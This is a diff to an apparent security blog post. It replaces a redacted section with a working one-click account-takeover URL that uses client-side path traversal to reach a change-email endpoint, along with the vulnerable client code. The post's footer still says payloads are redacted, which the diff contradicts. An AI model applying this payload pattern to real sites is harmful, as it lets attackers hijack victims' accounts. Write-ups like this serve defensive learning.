@@ -106,14 +106,26 @@ Origin: https://redacted.example</code></pre>
                     <strong>Note:</strong> The exact route and parameters are changed for safety. Do not target real systems.
                 </div>
 
-                <h3>The Payload (Redacted)</h3>
-                <p>The original proof-of-concept used a single URL. To prevent misuse, the direct payload is not shown.</p>
+                <h3>The Payload</h3>
+                <p>The exploit URL used Client-Side Path Traversal to escape the intended API route:</p>
 
-                <div class="redacted-box">
-                    <div class="redacted-content">
-                        <span class="redacted-label">PAYLOAD REDACTED</span>
-                        <p>Single-click URL that triggers account takeover</p>
-                    </div>
+                <pre><code class="language-plaintext">https://target.example/email-verification/#verify_token=../../../api/v1/user/change-email?email=attacker@evil.com&dummy=-secret123</code></pre>
+
+                <p>When the client parsed this URL:</p>
+                <pre><code class="language-javascript">// Client code (vulnerable)
+const parts = hash.replace("#verify_token=", "").split("-");
+const codeId = parts[0];  // "../../../api/v1/user/change-email?email=attacker@evil.com&dummy="
+const secret = parts[1];  // "secret123"
+
+// This then constructs:
+fetch(`/api/v1/verification/${codeId}`, { method: 'POST', body: { secret } })
+// Which resolves to:
+// POST /api/v1/user/change-email?email=attacker@evil.com&dummy=</code></pre>
+
+                <p>The path traversal (<code>../../../</code>) escaped the <code>/api/v1/verification/</code> prefix and hit the <code>change-email</code> endpoint directly. Since the victim was already logged in, their session cookie authenticated the request.</p>
+
+                <div class="callout callout-danger">
+                    <strong>One click = Account takeover.</strong> The victim clicks the link, their email gets changed to the attacker's, and they're permanently locked out.
                 </div>
             </section>
 
@@ -265,7 +277,7 @@ Origin: https://redacted.example</code></pre>
                 <p>This post is for educational and defensive purposes. Do not test on systems without written permission. All identifiers, API paths, and payloads are altered or redacted.</p>
 
                 <div class="callout callout-success">
-                    <strong>Questions or feedback?</strong> Ping me on <a href="https://x.com/AloookBishoyi" target="_blank" rel="noopener">X/Twitter</a>
+                    <strong>Questions or feedback?</strong> Ping me on <a href="https://x.com/hamidonsolo" target="_blank" rel="noopener">X/Twitter @hamidonsolo</a>
                 </div>
             </section>
         </div>
